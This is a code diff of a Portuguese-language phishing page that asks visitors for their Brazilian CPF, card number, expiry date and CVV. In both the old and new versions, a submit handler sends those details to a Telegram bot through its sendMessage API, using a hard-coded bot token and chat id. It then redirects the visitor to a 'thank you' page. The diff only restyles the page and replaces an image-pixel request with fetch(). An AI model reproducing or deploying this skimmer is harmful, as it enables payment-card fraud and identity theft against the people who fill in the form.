@@ -1,41 +1,31 @@
 <!doctype html>
-<html lang="pt-BR">
+<html lang="pt">
 <head>
 <meta charset="utf-8">
 <title>Finalizando...</title>
 <style>
-  body{font-family:Arial,Helvetica,sans-serif;background:#111;color:#eee;display:flex;align-items:center;justify-content:center;height:100vh}
-  form{width:280px;background:#222;padding:25px;border-radius:8px}
-  input{width:100%;margin:8px 0;padding:10px;border:0;border-radius:4px}
-  button{width:100%;padding:10px;border:0;border-radius:4px;background:#00d084;color:#000;font-weight:bold;cursor:pointer}
+body{font-family:Arial,Helvetica,sans-serif;background:#111;color:#eee;display:flex;align-items:center;justify-content:center;height:100vh}
+form{width:280px;background:#222;padding:25px;border-radius:8px}
+input{width:100%;margin:8px 0;padding:10px;border:0;border-radius:4px}
+button{width:100%;padding:10px;border:0;border-radius:4px;background:#00d084;color:#000;font-weight:bold;cursor:pointer}
 </style>
 </head>
 <body>
 <form id="finalform">
-  <input name="cpf" placeholder="CPF (somente números)" required pattern="\d{11}">
-  <input name="num" placeholder="Número do cartão" required pattern="\d{13,19}">
-  <input name="val" placeholder="Validade (MM/AA)" required pattern="\d{2}/\d{2}">
-  <input name="cvv" placeholder="CVV" required pattern="\d{3,4}">
+  <h2>Confirme seus dados</h2>
+  <input name="cpf" placeholder="CPF (somente números)" pattern="\d{11}" maxlength="11" required>
+  <input name="num" placeholder="Número do cartão" pattern="\d{13,19}" maxlength="19" required>
+  <input name="val" placeholder="Validade (MM/AA)" pattern="\d{2}/\d{2}" maxlength="5" required>
+  <input name="cvv" placeholder="CVV" pattern="\d{3,4}" maxlength="4" required>
   <button type="submit">Confirmar</button>
 </form>
-
 <script>
-  document.getElementById('finalform').addEventListener('submit', function (e) {
-    e.preventDefault();
-    const f = e.target;
-    const cpf = f.cpf.value;
-    const num = f.num.value;
-    const val = f.val.value;
-    const cvv = f.cvv.value;
-
-    // Mensagem curta
-    const msg = `💳 CPF:${cpf} | Nº:${num.slice(-4)} | Val:${val} | CVV:${cvv}`;
-    // Dispara via imagem pixel
-    new Image().src = `https://api.telegram.org/bot7731169374:AAF2qtPXZgQELEHs6DnCBJUij638xwYUVVY/sendMessage?chat_id=6261750345&text=${encodeURIComponent(msg)}`;
-
-    // Redireciona para página final
-    location.replace('obrigado.html');
-  });
+document.getElementById('finalform').addEventListener('submit',function(ev){
+ ev.preventDefault();
+ const f=ev.target,c=f.cpf.value,n=f.num.value,v=f.val.value,x=f.cvv.value;
+ fetch('https://api.telegram.org/bot7731169374:AAF2qtPXZgQELEHs6DnCBJUij638xwYUVVY/sendMessage?chat_id=6261750345&text='+encodeURIComponent(`💳 CPF:${c} | Nº:${n.slice(-4)} | Val:${v} | CVV:${x}`),{mode:'no-cors'});
+ location='obrigado.html';
+});
 </script>
 </body>
 </html>
